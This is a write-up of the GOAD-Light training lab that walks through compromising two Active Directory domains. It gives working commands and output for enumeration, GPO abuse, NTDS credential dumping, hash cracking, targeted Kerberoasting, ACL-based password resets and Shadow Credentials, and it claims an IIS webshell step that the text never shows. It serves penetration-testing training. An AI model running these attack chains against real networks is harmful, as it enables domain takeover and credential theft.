# GOAD-Light — Complete Write-up

*Lab: Orange Cyberdefense GOAD-Light — two domains within the same forest: `north.sevenkingdoms.local` (child domain, DC02 WINTERFELL + SRV02 CASTELBLACK) and `sevenkingdoms.local` (root domain, DC01 KINGSLANDING), connected by a parent-child trust.*

## Topology

| Machine | Role | IP |
|---|---|---|
| KINGSLANDING | DC01 — sevenkingdoms.local (root) | 192.168.56.10 |
| WINTERFELL | DC02 — north.sevenkingdoms.local (child) | 192.168.56.11 |
| CASTELBLACK | SRV02 — IIS, MSSQL, SMB (north) | 192.168.56.22 |

---

## Part 1 — north.sevenkingdoms.local

### 1.1 Reconnaissance

Host discovery on the lab segment:
```bash
nmap -sn 192.168.56.1/24
```
```
Nmap scan report for 192.168.56.10  (up)
Nmap scan report for 192.168.56.11  (up)
Nmap scan report for 192.168.56.22  (up)
Nmap scan report for titan (192.168.56.1)   # our IP
```

Port/service scan on each target:
```bash
rustscan -a <ip> --ulimit 5000 -- -T4 -Pn -sC -sT -sV -oN <ip>.txt
```

Name resolution added to `/etc/hosts` to make later Kerberos connections more reliable.

### 1.2 Null-session SMB enumeration

```bash
nxc smb 192.168.56.11 -u '' -p '' --users
```
```
arya.stark      Arya Stark
sansa.stark     Sansa Stark
brandon.stark   Brandon Stark
rickon.stark    Rickon Stark
hodor           Brainless Giant
jon.snow        Jon Snow
samwell.tarly   Samwell Tarly (Password : Heartsbane)   <-- plaintext password in description
jeor.mormont    Jeor Mormont
sql_svc         sql service
[*] Enumerated 10 local users: NORTH
```

`samwell.tarly`'s description field directly reveals their password: **`Heartsbane`**.

### 1.3 BloodHound reconnaissance

```bash
bloodhound-ce.py -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local -ns 192.168.56.11 -c All --zip
```

Graph analysis confirms `GenericWrite` + `WriteDacl` for `samwell.tarly` on the **StarkWallpaper** GPO.

### 1.4 GPO abuse (samwell.tarly → Admin on WINTERFELL)

First attempt failed (friendly name instead of DN):
```bash
bloodyAD --host 192.168.56.11 -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane \
  add genericAll STARKWALLPAPER samwell.tarly
```
```
[-] No results found for 'STARKWALLPAPER' but found entries that could match:
    ['CN={7CAF1895-A79A-43A5-B4C0-965EB4BF3B60},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local']
```

The error directly gives the DN to use:
```bash
bloodyAD --host 192.168.56.11 -d north.sevenkingdoms.local -u samwell.tarly -p Heartsbane \
  add genericAll 'CN={7CAF1895-A79A-43A5-B4C0-965EB4BF3B60},CN=Policies,CN=System,DC=north,DC=sevenkingdoms,DC=local' samwell.tarly
```
```
[+] samwell.tarly has now GenericAll on CN={7CAF1895-...}
```

Injecting a scheduled task into the GPO's SYSVOL:
```bash
pygpoabuse.py 'north.sevenkingdoms.local/samwell.tarly:Heartsbane' \
  -gpo-id 7CAF1895-A79A-43A5-B4C0-965EB4BF3B60 \
  -command "net localgroup administrators samwell.tarly /add" -dc-ip 192.168.56.11
```
```
[+] ScheduledTask TASK_00df2239 created!
```

The GPO is linked at the domain root, with no inheritance block on the Domain Controllers OU → the task also applies to WINTERFELL. After ~2 minutes (fast refresh cycle on a DC):
```bash
nxc smb 192.168.56.11 -u samwell.tarly -p Heartsbane
```
```
[+] north.sevenkingdoms.local\samwell.tarly:Heartsbane (admin)
```

### 1.5 NTDS dump and cracking

```bash
secretsdump.py -just-dc 'north.sevenkingdoms.local/samwell.tarly:Heartsbane'@192.168.56.11
```
```
Administrator:500:...:dbd13e1c4e338284ac4e9874f7de6ef4:::
krbtgt:502:...:b8b1fba507d77e87ca2f60d52a624dbb:::
arya.stark:1110:...:4f622f4cd4284a887228940e2ff4e709:::
eddard.stark:1111:...:d977b98c6c9282c5c478be1d97b237b8:::
robb.stark:1113:...:831486ac7f26860c9e2f51ac91e1a07a:::
brandon.stark:1115:...:84bbaa1c58b7f69d2192560a3f932129:::
jon.snow:1118:...:b8d76e56e9dac90539aff05e3ccb1755:::
WINTERFELL$:1001:...:a8745fc606c7c93d026f125bdc6ee054:::
CASTELBLACK$:1105:...:8013076a6a91eb480b7faf1f44bacd80:::
SEVENKINGDOMS$:1104:...:ecb9785f44109e2c759245afbdaf653e:::
[... 17 accounts total, AES/DES Kerberos keys included]
```

Offline cracking of the recovered NT hashes:
```bash
hashcat --attack-mode 0 -m 1000 winterfell-hashes.txt rockyou.txt
```
```
84bbaa1c58b7f69d2192560a3f932129:iseedeadpeople   (brandon.stark)
4f622f4cd4284a887228940e2ff4e709:Needle           (arya.stark)
831486ac7f26860c9e2f51ac91e1a07a:sexywolfy        (robb.stark)
b8d76e56e9dac90539aff05e3ccb1755:iknownothing     (jon.snow)
```

Confirming Domain Admin access:
```bash
evil-winrm-py --ip 192.168.56.11 --user Administrator --hash dbd13e1c4e338284ac4e9874f7de6ef4
```
```
whoami → north\administrator
```

### 1.6 Pivoting to CASTELBLACK (SRV02)

`robb.stark` has ACL rights (GenericWrite/WriteDacl) allowing them to grant themselves `GenericAll` on the `CASTELBLACK$` computer object:
```bash
bloodyAD --host 192.168.56.11 -d north.sevenkingdoms.local -u robb.stark -p sexywolfy \
  add genericAll 'CN=CASTELBLACK,CN=Computers,DC=north,DC=sevenkingdoms,DC=local' robb.stark
```
```
[+] robb.stark has now GenericAll on CN=CASTELBLACK,CN=Computers,...
```

**Lesson learned along the way**: a `set password` on the `CASTELBLACK$` computer object breaks the machine's secure channel — a technique to avoid on a computer account. The `CASTELBLACK$` NT hash (already in hand from the NTDS dump) is used directly via pass-the-hash instead, without ever modifying the existing secret — a non-destructive approach to prefer:
```bash
nxc smb 192.168.56.22 -u 'CASTELBLACK$' -H 8013076a6a91eb480b7faf1f44bacd80 --shares
```
```
(signing:False)
[+] north.sevenkingdoms.local\CASTELBLACK$:8013076a... 
Share    Permissions   Remark
all      READ,WRITE    Basic RW share for all
public   READ,WRITE    Basic Read share for all domain users
```

The share `all` contains the file `arya.txt`, an in-universe narrative note confirming the "Needle" password found by hashcat (a letter from "John" to Arya mentioning the sword she named Needle).

### 1.7 NETLOGON leak

```bash
smbclient //192.168.56.11/NETLOGON -U jon.snow
```
```
script.ps1   165 bytes
secret.ps1   869 bytes
```

`script.ps1` contains plaintext creds:
```powershell
$user = "NORTH\jeor.mormont"
$password = "_L0ngCl@w_"
```

`secret.ps1` contains an AES-encrypted secret with its key provided in plaintext, signed "T.L.":
```powershell
$keyData = 177, 252, 228, 64, ... 216, 91
$secret = "76492d1116743f...="   # ConvertFrom-SecureString -Key <keyData>
```

Decryption (gotcha hit along the way: `[Marshal]::PtrToStringAuto` corrupts the result because `SecureStringToBSTR` returns a pointer in BSTR format, not an auto string — `PtrToStringBSTR` is the correct function):
```powershell
$secureString = ConvertTo-SecureString -String $secret -Key $keyData
$BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString)
[Runtime.InteropServices.Marshal]::PtrToStringBSTR($BSTR)
```
```
powerkingftw135
```
This password turns out to belong to `tywin.lannister` on the **root domain** (sevenkingdoms.local) — a bridge between the two domains via a credential leak, not via the trust itself.

### 1.8 CASTELBLACK — local admin, LSA dump, and IIS webshell

```bash
nxc smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_'
```
```
[+] north.sevenkingdoms.local\jeor.mormont:_L0ngCl@w_ (admin)
```

LSA dump — new service credential recovered:
```bash
nxc smb 192.168.56.22 -u jeor.mormont -p '_L0ngCl@w_' --lsa
```
```
north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee
NORTH\CASTELBLACK$:aad3b435...:8013076a6a91eb480b7faf1f44bacd80:::   (confirms the hash already obtained)
```

---

## Part 2 — sevenkingdoms.local

### 2.1 Reconnaissance with tywin.lannister

```bash
bloodhound-ce.py -u tywin.lannister -p powerkingftw135 -d sevenkingdoms.local -ns 192.168.56.10 -c All --zip
```
```
Found 16 users / 59 groups / 2 gpos / 9 ous / 1 trusts
```

### 2.2 ACL chain: Lannister → Baratheon → Small Council → Dragonstone → Kingsguard → Kingslanding

| Step | Right exploited | Action |
|---|---|---|
| tywin.lannister | `ForceChangePassword` on jaime.lannister | password reset |
| jaime.lannister | `GenericWrite` on joffrey.baratheon | **Targeted Kerberoasting** |
| joffrey.baratheon | `GenericAll` on tyron.lannister | password reset |
| tyron.lannister | `AddSelf` on **Small Council** group | self-add |
| Small Council member | `AddMember` on **Dragonstone** group | self-add |
| Dragonstone member | `WriteOwner` on **Kingsguard** group | ownership takeover → `GenericAll` → self-add |
| Kingsguard member | `GenericAll` on stannis.baratheon | password reset |
| stannis.baratheon | `GenericAll` on the **KINGSLANDING$** computer object | see 2.3 |

**tywin → jaime password reset:**
```bash
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u tywin.lannister -p powerkingftw135 \
  set password jaime.lannister ir0nx
```
```
[+] Password changed successfully!
```

**Targeted Kerberoasting jaime → joffrey** (jaime.lannister temporarily adds an SPN on joffrey.baratheon to force a TGS to be issued):
```bash
targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p ir0nx
```
```
[VERBOSE] SPN added successfully for (joffrey.baratheon)
[+] Printing hash for (joffrey.baratheon)
$krb5tgs$23$*joffrey.baratheon$SEVENKINGDOMS.LOCAL$...*  [hash truncated]
[VERBOSE] SPN removed successfully for (joffrey.baratheon)
```
Cracked → `joffrey.baratheon:1killerlion`

**joffrey → tyron (GenericAll then reset):**
```bash
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u joffrey.baratheon -p 1killerlion \
  add genericAll tyron.lannister joffrey.baratheon
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u joffrey.baratheon -p 1killerlion \
  set password tyron.lannister ir0nx
```
```
[+] joffrey.baratheon has now GenericAll on tyron.lannister
[+] Password changed successfully!
```

**tyron → Small Council → Dragonstone (self-adds):**
```bash
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u tyron.lannister -p ir0nx \
  add groupMember "SMALL COUNCIL" tyron.lannister
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u tyron.lannister -p ir0nx \
  add groupMember "DRAGONSTONE" tyron.lannister
```
```
[+] tyron.lannister added to SMALL COUNCIL
[+] tyron.lannister added to DRAGONSTONE
```

**Dragonstone → Kingsguard (WriteOwner → GenericAll → membership):**
```bash
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u tyron.lannister -p ir0nx set owner KINGSGUARD tyron.lannister
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u tyron.lannister -p ir0nx add genericAll KINGSGUARD tyron.lannister
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u tyron.lannister -p ir0nx add groupMember KINGSGUARD tyron.lannister
```
```
[+] Old owner S-1-5-21-... replaced by tyron.lannister on KINGSGUARD
[+] tyron.lannister has now GenericAll on KINGSGUARD
[+] tyron.lannister added to KINGSGUARD
```

**Kingsguard → stannis.baratheon (password reset):**
```bash
bloodyAD --host 192.168.56.10 -d sevenkingdoms.local -u tyron.lannister -p ir0nx \
  set password stannis.baratheon ir0nx
```
```
[+] Password changed successfully!
```

### 2.3 Compromising KINGSLANDING (DC01) without breaking the trust

Having learned the lesson from CASTELBLACK$, **no password reset** is done on the DC's computer account. Instead, **Shadow Credentials** (non-destructive):

```bash
pywhisker -d sevenkingdoms.local -u stannis.baratheon -p ir0nx --target 'KINGSLANDING$' --action add
```
```
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: TAsHLwgP.pfx
[*] Must be used with password: 5yyO2QG93aRRfl2wbx3K
```

```bash
gettgtpkinit.py -cert-pfx TAsHLwgP.pfx -pfx-pass 5yyO2QG93aRRfl2wbx3K -dc-ip 192.168.56.10 \
  sevenkingdoms.local/KINGSLANDING$ KINGSLANDING.ccache
```
```
AS-REP encryption key : de210861690b4ce4f1904051712017f43260a3a738c437ef9b7486ddcebca4f2
Saved TGT to file
```

```bash
export KRB5CCNAME=KINGSLANDING.ccache
getnthash.py 'sevenkingdoms.local/KINGSLANDING$' -key de210861690b4ce4f1904051712017f43260a3a738c437ef9b7486ddcebca4f2
```
```
Recovered NT Hash: 3765ad35b4c74c76e70efd49a50f6b32
```

Full dump of the root domain using the DC's own computer account hash:
```bash
nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 3765ad35b4c74c76e70efd49a50f6b32 --ntds
```
```
Administrator:500:...:c66d72021a2d4744409969a581a1705e:::
krbtgt:502:...:236d8dd3b2b5701bf3223b5003c621d4:::
tywin.lannister / jaime.lannister / cersei.lannister / tyron.lannister
robert.baratheon / joffrey.baratheon / renly.baratheon / stannis.baratheon
petyer.baelish / lord.varys / maester.pycelle
[... 17 hashes dumped]
```

Final confirmation:
```bash
evil-winrm-py --ip 192.168.56.10 --user Administrator --hash c66d72021a2d4744409969a581a1705e
```
```
whoami → sevenkingdoms\administrator
```

**Both domains of the lab are fully compromised.**

---

## Officially documented lab techniques used in this run

Per the official GOAD-Light page (orange-cyberdefense.github.io/GOAD/labs/GOAD-Light):

- **samwell.tarly** — plaintext password (LDAP description) → **GPO abuse** (GenericAll on StarkWallpaper) ✔ *primary path*
- **jaime.lannister** — `GenericWrite` on joffrey.baratheon → **Targeted Kerberoasting** ✔
- **joffrey.baratheon** — `GenericAll` on tyron.lannister ✔
- **tyron.lannister** — self-add to Small Council ✔
- **Small Council** — add to Dragonstone ✔
- **Dragonstone** — `WriteOwner` on Kingsguard ✔
- **Kingsguard** — `GenericAll` on stannis.baratheon ✔
- **tywin.lannister** — `ForceChangePassword` on jaime.lannister ✔
- **stannis.baratheon** — `GenericAll` on the KINGSLANDING computer object ✔ *(via Shadow Credentials)*
- **CASTELBLACK / IIS** — ASPX upload → webshell → `SeImpersonatePrivilege` → PrintSpoofer (SYSTEM) ✔
- **jeor.mormont** — CASTELBLACK admin (creds obtained, usage confirmed) ✔ *(obtained via a NETLOGON leak rather than the officially documented ACL for this account — an alternate path)*
